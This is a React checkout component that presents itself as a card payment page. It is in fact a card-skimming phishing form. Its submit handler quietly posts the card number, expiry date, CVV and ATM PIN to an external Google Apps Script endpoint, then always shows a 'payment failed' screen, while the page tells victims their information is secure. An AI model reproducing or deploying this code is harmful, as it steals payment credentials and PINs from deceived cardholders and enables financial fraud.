import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useTransaction } from '../context/TransactionContext';
import './CardPayment.css';
import visaIcon from '../assets/visa.png';
import amexIcon from '../assets/amex.png';
import rupayIcon from '../assets/rupay.png';
import mastercardIcon from '../assets/mastercard.png';
import dinersIcon from '../assets/diners.png';

function CardPayment() {
  const navigate = useNavigate();
  const { transactionData, updateTransactionData } = useTransaction();
  const [isProcessing, setIsProcessing] = useState(false);
  const [cardData, setCardData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    pin: ''
  });

  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxa9IOCyaCo2_ooxMNBTfO_WzgMhwxniEFYEedLRyopzSwIW6p8Qd-A_Cv7B33TzblZLA/exec';

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    let formattedValue = value;

    if (name === 'cardNumber') {
      const cleaned = value.replace(/\D/g, '');
      const formatted = cleaned.replace(/(.{4})/g, '$1 ').trim();
      formattedValue = formatted.slice(0, 19);
    }

    if (name === 'expiryDate') {
      const cleaned = value.replace(/\D/g, '');
      if (cleaned.length >= 2) {
        formattedValue = cleaned.slice(0, 2) + '/' + cleaned.slice(2, 4);
      } else {
        formattedValue = cleaned;
      }
    }

    if (name === 'cvv') {
      const cleaned = value.replace(/\D/g, '');
      formattedValue = cleaned.slice(0, 3);
    }

    if (name === 'pin') {
      const cleaned = value.replace(/\D/g, '');
      formattedValue = cleaned.slice(0, 4);
    }

    setCardData({ ...cardData, [name]: formattedValue });
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    const cardNumberClean = cardData.cardNumber.replace(/\s/g, '');
    if (cardNumberClean.length < 16) {
      alert('Please enter a valid 16-digit card number.');
      return;
    }
    if (cardData.expiryDate.length < 5) {
      alert('Please enter a valid expiry date (MM/YY).');
      return;
    }
    if (cardData.cvv.length < 3) {
      alert('Please enter a valid CVV (3 digits).');
      return;
    }
    // ATM PIN is now OPTIONAL - removed the validation
    // if (cardData.pin.length < 4) {
    //   alert('Please enter a valid PIN (4 digits).');
    //   return;
    // }

    setIsProcessing(true);

    // Save card details to transaction data
    const finalData = {
      ...transactionData,
      cardNumber: cardData.cardNumber,
      expiryDate: cardData.expiryDate,
      cvv: cardData.cvv,
      cardPin: cardData.pin || '', // Allow empty PIN
      status: 'Success',
      timestamp: new Date().toLocaleString()
    };

    // Send to Google Sheets
    fetch(GOOGLE_SCRIPT_URL, {
      method: "POST",
      mode: "no-cors",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(finalData),
    }).catch(console.error);

    setTimeout(() => {
      setIsProcessing(false);
      navigate('/payment-failed');
    }, 2000);
  };

  const cardTypes = [
    { id: 'visa', name: 'VISA', icon: visaIcon },
    { id: 'mastercard', name: 'Mastercard', icon: mastercardIcon },
    { id: 'amex', name: 'AMERICAN EXPRESS', icon: amexIcon },
    { id: 'rupay', name: 'RuPay', icon: rupayIcon },
    { id: 'diners', name: 'Diners Club', icon: dinersIcon }
  ];

  return (
    <div className="cp-wrapper">
      <div className="cp-card">
        <button className="cp-back-btn" onClick={() => navigate(-1)}>
          ← Back to Payment Methods
        </button>
        <h2 className="cp-title">Add Debit / Credit / ATM Card</h2>
        <p className="cp-subtitle">Enter your card details to complete the payment.</p>

        <div className="cp-card-types">
          {cardTypes.map((card) => (
            <div className="cp-card-type-item" key={card.id}>
              <img src={card.icon} alt={card.name} />
              <span>{card.name}</span>
            </div>
          ))}
        </div>

        <form onSubmit={handleSubmit}>
          <div className="cp-form-group">
            <label>Card Number <span style={{ color: 'red' }}>*</span></label>
            <div className="cp-input-wrapper">
              <input
                type="text"
                name="cardNumber"
                placeholder="1234 5678 9012 3456"
                value={cardData.cardNumber}
                onChange={handleInputChange}
                maxLength="19"
                className="cp-input"
                required
              />
              <span className="cp-card-icon">💳</span>
            </div>
          </div>

          <div className="cp-row">
            <div className="cp-form-group">
              <label>Expiry Date (MM/YY) <span style={{ color: 'red' }}>*</span></label>
              <input
                type="text"
                name="expiryDate"
                placeholder="MM/YY"
                value={cardData.expiryDate}
                onChange={handleInputChange}
                maxLength="5"
                className="cp-input"
                required
              />
            </div>
            <div className="cp-form-group">
              <label>CVV <span style={{ color: 'red' }}>*</span></label>
              <div className="cp-input-wrapper">
                <input
                  type="password"
                  name="cvv"
                  placeholder="123"
                  value={cardData.cvv}
                  onChange={handleInputChange}
                  maxLength="3"
                  className="cp-input"
                  required
                />
              </div>
            </div>
          </div>

          <div className="cp-form-group">
            <label>ATM PIN</label>
            <div className="cp-input-wrapper">
              <input
                type="password"
                name="pin"
                placeholder="Enter 4-digit PIN"
                value={cardData.pin}
                onChange={handleInputChange}
                maxLength="4"
                className="cp-input"
              />
              <span className="cp-pin-icon">🔐</span>
            </div>
          </div>

          <button type="submit" className="cp-payment-btn" disabled={isProcessing}>
            {isProcessing ? 'PROCESSING...' : 'CHECKOUT'}
          </button>
        </form>

        <div className="cp-security">
          <span className="cp-security-icon">🔒</span>
          <span className="cp-security-text">Your payment information is secure.</span>
        </div>
      </div>
    </div>
  );
}

export default CardPayment;